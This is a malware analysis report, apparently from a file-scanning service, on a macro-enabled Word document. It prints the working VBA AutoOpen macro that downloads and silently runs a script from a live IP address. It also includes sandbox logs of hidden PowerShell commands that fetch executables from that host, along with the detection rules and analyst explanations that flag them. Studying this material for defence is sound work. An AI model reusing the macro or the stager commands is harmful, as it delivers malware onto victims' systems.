threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

trid.file_type: Word Microsoft Office Open XML Format document (with Macro)
Word Microsoft Office Open XML Format document

crowdsourced_yara_results.description: This signature detects an office document with an embedded VBA project. While this is fairly common it is sometimes used for malicious intent.
crowdsourced_yara_results.author: InQuest Labs

macros.vba_code:
Sub AutoOpen()
    Dim URL As String
    Dim httpReq As Object
    Dim byteData() As Byte
    Dim fileNum As Integer
    URL = "http://49.13.194.118/as.vbs"
    Set httpReq = CreateObject("MSXML2.XMLHTTP")
    httpReq.Open "GET", URL, False
    httpReq.send
    byteData = httpReq.responseBody
    Set httpReq = Nothing
    fileNum = FreeFile()
    Open "C:\Windows\Temp\as.vbs" For Binary Access Write As #fileNum
    Put #fileNum, , byteData
    Close #fileNum
    Dim vbsFilePath As String
    vbsFilePath = "C:\Windows\Temp\as.vbs" ' Path to the VBScript file
    
    ' Run the VBScript file using Shell
    Shell "wscript.exe """ & vbsFilePath & """", vbHide
End Sub
macros.properties: auto-open create-ole download enum-windows handle-file open-file run-file write-file

sigma_analysis_results.rule_title: Office Application Initiated Network Connection To Non-Local IP
sigma_analysis_results.rule_description:
Detects an office application (Word, Excel, PowerPoint)  that initiate a network connection to a non-private IP addresses.
This rule aims to detect traffic similar to one seen exploited in CVE-2021-42292.
This rule will require an initial baseline and tuning that is specific to your organization.
sigma_analysis_results.rule_author: Christopher Peacock '@securepeacock', SCYTHE '@scythe_io', Florian Roth (Nextron Systems), Tim Shelton

match_context.values: @{SourceIsIpv6=false; DestinationPort=80; DestinationIp=49.13.194.118; Protocol=tcp; SourceIp=192.168.2.26; DestinationIsIpv6=false; EventID=3; SourcePort=49785; Image=C:\Program Files\Microsoft Office\Office16\WINWORD.EXE; Initiated=true}

sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via CommandLine
sigma_analysis_results.rule_author: James Pemberton / @4A616D6573, Endgame, JHasenbusch, oscd.community, Austin Songer @austinsonger

match_context.values: @{Hashes=SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; CurrentDirectory=C:\Windows\system32\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine=wscript.exe "C:\Windows\Temp\as.vbs"; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -windowstyle hidden -Command "(New-Object System.Net.WebClient).DownloadFile('http://49.13.194.118/setup.exe', 'C:\Windows\Temp\setup.exe')"; EventID=1; ParentImage=C:\Windows\System32\wscript.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

@{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\Bruno\AppData\Local\Temp\; OriginalFileName=PowerShell.EXE; Hashes=MD5=C32CA4ACFCC635EC1EA6ED8A34DF5FAC,SHA256=73A3C4AEF5DE385875339FC2EB7E58A9E8A47B6161BDC6436BF78A763537BE70,IMPHASH=194427A488ED1DD0A91731658B071667; Description=Windows PowerShell; EventID=1; ParentCommandLine=wscript.exe "C:\Windows\Temp\as.vbs"; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -windowstyle hidden -Command "(New-Object System.Net.WebClient).DownloadFile('http://49.13.194.118/setup.exe', 'C:\Windows\Temp\setup.exe')"; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentImage=C:\Windows\SysWOW64\wscript.exe; IntegrityLevel=High; Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

@{CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -windowstyle hidden -Command "(New-Object System.Net.WebClient).DownloadFile('http://49.13.194.118/a1.exe', 'C:\Windows\Temp\setup.exe')"; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; EventID=1}
@{CommandLine="pwsh.exe" -windowstyle hidden -Command (New-Object System.Net.WebClient).DownloadFile('http://49.13.194.118/setup.exe', '%wintmp%\setup.exe'); Image=pwsh.exe; EventID=1}

sigma_analysis_results.rule_description: Detects non-interactive PowerShell activity by looking at the "powershell" process with a non-user GUI process such as "explorer.exe" as a parent.

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Windows\system32\; OriginalFileName=PowerShell.EXE; Hashes=SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; Description=Windows PowerShell; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine=wscript.exe "C:\Windows\Temp\as.vbs"; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -windowstyle hidden -Command "(New-Object System.Net.WebClient).DownloadFile('http://49.13.194.118/setup.exe', 'C:\Windows\Temp\setup.exe')"; EventID=1; ParentImage=C:\Windows\System32\wscript.exe; IntegrityLevel=High; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

@{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\Bruno\AppData\Local\Temp\; OriginalFileName=PowerShell.EXE; Hashes=MD5=C32CA4ACFCC635EC1EA6ED8A34DF5FAC,SHA256=73A3C4AEF5DE385875339FC2EB7E58A9E8A47B6161BDC6436BF78A763537BE70,IMPHASH=194427A488ED1DD0A91731658B071667; Description=Windows PowerShell; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentCommandLine=wscript.exe "C:\Windows\Temp\as.vbs"; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -windowstyle hidden -Command "(New-Object System.Net.WebClient).DownloadFile('http://49.13.194.118/setup.exe', 'C:\Windows\Temp\setup.exe')"; EventID=1; ParentImage=C:\Windows\SysWOW64\wscript.exe; IntegrityLevel=High; Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

@{CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -windowstyle hidden -Command "(New-Object System.Net.WebClient).DownloadFile('http://49.13.194.118/a1.exe', 'C:\Windows\Temp\setup.exe')"; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; EventID=1}

sigma_analysis_results.rule_description: Detects the creation of a new office macro files on the systems

match_context.values: @{Image=C:\Program Files\Microsoft Office\Office16\WINWORD.EXE; TargetFilename=C:\Users\george\Desktop\~$68678.docm; EventID=11}
@{TargetFilename=C:\Users\user\AppData\Local\Temp\2de3ee0c8e9a3f76d3eeddc071db97c2.docm}
@{TargetFilename=C:\Users\user\AppData\Local\Temp\~$e3ee0c8e9a3f76d3eeddc071db97c2.docm}
@{TargetFilename=C:\Users\Administrator\AppData\Roaming\Microsoft\Templates\~$Normal.dotm}

crowdsourced_ids_results.rule_msg: POLICY-OTHER HTTP request by IPv4 address attempt
crowdsourced_ids_results.rule_raw: alert tcp any any -> any $HTTP_PORTS ( msg:"POLICY-OTHER HTTP request by IPv4 address attempt"; flow:to_server,established; http_header; content:"Host:",fast_pattern,nocase; pcre:"/^Host\x3a\s*(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9]?[0-9])\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9]?[0-9])\s*:?\s*\d*\s*$/ims"; service:http; reference:url,www.w3.org/Protocols/rfc2616/rfc2616-sec15.html; classtype:policy-violation; sid:50447; rev:1; )

crowdsourced_ids_results.rule_msg: BROWSER-PLUGINS Microsoft Windows Scripting Host Shell ActiveX function call access
crowdsourced_ids_results.rule_raw: alert tcp $EXTERNAL_NET $HTTP_PORTS -> $HOME_NET any ( msg:"BROWSER-PLUGINS Microsoft Windows Scripting Host Shell ActiveX function call access"; flow:to_client,established; file_data; content:"wscript.shell",fast_pattern,nocase; pcre:"/(ActiveX|Create)Object\s*\(\s*[\x22\x27]?wscript\.shell/i"; metadata:policy max-detect-ips drop,policy security-ips drop; service:http; reference:bugtraq,101098; reference:bugtraq,10652; reference:bugtraq,17462; reference:cve,2006-0003; reference:cve,2017-11774; reference:url,portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11774; reference:url,technet.microsoft.com/en-us/security/bulletin/MS06-014; classtype:attempted-user; sid:8068; rev:17; )

crowdsourced_ids_results.rule_msg: FILE-IDENTIFY Microsoft Windows Visual Basic script file download request
crowdsourced_ids_results.rule_raw: alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS ( msg:"FILE-IDENTIFY Microsoft Windows Visual Basic script file download request"; flow:to_server,established; http_uri; content:".vbs",fast_pattern,nocase; pcre:"/\x2evbs([\?\x5c\x2f]|$)/ims"; metadata:policy max-detect-ips drop; service:http; reference:url,en.wikipedia.org/wiki/Vbs; classtype:misc-activity; sid:18758; rev:12; )

crowdsourced_ids_results.rule_msg: ET INFO Executable Download from dotted-quad Host
crowdsourced_ids_results.rule_raw: alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET INFO Executable Download from dotted-quad Host"; flow:established,to_server; http.uri; content:".exe"; endswith; nocase; http.host; content:"."; offset:1; depth:3; content:"."; within:4; content:"."; within:4; pcre:"/^(?:\d{1,3}\.){3}\d{1,3}$/"; http.request_line; content:".exe HTTP/1."; fast_pattern; classtype:bad-unknown; sid:2016141; rev:9; metadata:attack_target Client_and_Server, created_at 2013_01_03, deployment Perimeter, former_category INFO, performance_impact Significant, signature_severity Informational, updated_at 2024_04_09;)

crowdsourced_ids_results.rule_msg: ET HUNTING PowerShell Hidden Window Command Common In Powershell Stagers M1
crowdsourced_ids_results.rule_raw: alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"ET HUNTING PowerShell Hidden Window Command Common In Powershell Stagers M1"; flow:established,to_client; file.data; content:!"|22|manifestVersion|22|"; content:!"<html"; content:!"|22 7d 2c|"; content:"powershell"; fast_pattern; nocase; content:"-w"; nocase; distance:0; content:"hidden"; within:17; classtype:bad-unknown; sid:2026989; rev:4; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, created_at 2019_02_28, deployment alert_only, former_category ATTACK_RESPONSE, performance_impact Low, confidence Low, signature_severity Major, tag PowerShell, updated_at 2023_04_25, reviewed_at 2023_10_11;)

crowdsourced_ids_results.rule_msg: ET HUNTING PowerShell DownloadFile Command Common In Powershell Stagers
crowdsourced_ids_results.rule_raw: alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"ET HUNTING PowerShell DownloadFile Command Common In Powershell Stagers"; flow:established,to_client; file.data; content:!"|22|manifestVersion|22|"; content:!"<html"; content:!"|22 7d 2c|"; content:"powershell"; fast_pattern; nocase; content:"DownloadFile|28|"; nocase; distance:0; classtype:bad-unknown; sid:2026994; rev:4; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, created_at 2019_02_28, deployment alert_only, former_category ATTACK_RESPONSE, performance_impact Low, confidence Low, signature_severity Major, tag PowerShell, updated_at 2023_04_25, reviewed_at 2023_10_11;)

crowdsourced_ids_results.rule_msg: ET INFO Dotted Quad Host VBS Request
crowdsourced_ids_results.rule_raw: alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET INFO Dotted Quad Host VBS Request"; flow:established,from_client; flowbits:isset,http.dottedquadhost; flowbits:set,http.dottedquadhost.vbs; flowbits:unset,http.dottedquadhost; http.request_line; content:".vbs HTTP/1."; nocase; fast_pattern; classtype:bad-unknown; sid:2027260; rev:4; metadata:attack_target Client_Endpoint, created_at 2019_04_23, deployment Perimeter, former_category INFO, performance_impact Significant, signature_severity Minor, updated_at 2020_04_08;)

alert http $EXTERNAL_NET any -> $HOME_NET any (msg:"TGI HUNT WScript.Shell Inbound"; flow:established,to_client; file_data; content:"WScript.Shell"; nocase; classtype:bad-unknown; sid:2610368; rev:2;)

crowdsourced_ai_results.analysis:
The provided VBA macro code is malicious and could potentially be used for malware delivery. The code creates an HTTP request to download a file from a remote location, saves it to the local file system, and then runs the file using the `Shell` function.

The malicious code is using the `CreateObject` function to create an instance of the `MSXML2.XMLHTTP` object, which is a COM object that allows for HTTP requests. The code then uses the `Open` method to specify the HTTP request method as "GET" and the URL of the remote file to download. The `send` method is then used to send the request to the remote server.

Once the file is downloaded, the code uses the `responseBody` property to retrieve the binary data of the file and stores it in a byte array. The `FreeFile` function is then used to open a file for binary access and write the byte array to the file. Finally, the `Shell` function is used to run the VBScript file using the `wscript.exe` command.

This code is malicious because it allows an attacker to download and execute arbitrary code on the target system. The attacker could use this code to deliver malware, such as a keylogger or a ransomware, to the target system. Additionally, the code uses the `Shell` function to run the VBScript file, which could potentially be used to execute other malicious commands on the target system.

The macros extracted from the document exhibit behaviors commonly associated with malicious intent. The 'AutoOpen()' subroutine in the 'NewMacros.bas' module downloads a VBScript file from a remote URL ('http://49.13.194.118/as.vbs') using an HTTP request. The downloaded script is then saved to the local system at 'C:\Windows\Temp\as.vbs'. Subsequently, the macro executes the downloaded VBScript file using the Windows Script Host ('wscript.exe').

This behavior indicates an attempt to download and execute arbitrary code from an external source, which can be indicative of malware delivery or execution. The use of dynamic URLs, downloading files, and executing scripts without user interaction are common tactics employed by malicious actors to evade detection and compromise systems.

Overall, the macros demonstrate characteristics that align with malicious activities, warranting a classification of 'Malicious'.

The macro named 'AutoOpen' in the 'NewMacros.bas' module exhibits suspicious behavior. It begins by declaring variables and defining a URL. Subsequently, it creates an instance of the 'MSXML2.XMLHTTP' object and utilizes it to establish a connection with the specified URL. The response from this connection is then stored in a byte array.

Following this, the macro creates a file named 'as.vbs' in the 'C:\\Windows\\Temp' directory and writes the contents of the byte array into this file. This file is then executed using the 'Shell' command, effectively launching the VBScript file.

The behavior of this macro raises concerns as it involves downloading a file from an external source and executing it, which could potentially lead to the execution of malicious code or compromise the system's security.
